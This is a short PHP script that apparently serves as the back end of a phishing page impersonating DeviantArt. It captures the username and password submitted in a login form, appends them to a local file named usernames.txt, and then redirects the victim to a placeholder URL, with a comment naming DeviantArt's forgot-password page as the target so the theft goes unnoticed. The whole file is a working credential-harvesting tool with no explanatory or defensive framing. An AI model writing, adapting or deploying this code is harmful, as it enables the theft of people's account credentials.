<?php

file_put_contents("usernames.txt", "Deviantart Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.deviantart.com/users/forgot/
header("Location: $url");
exit();
?>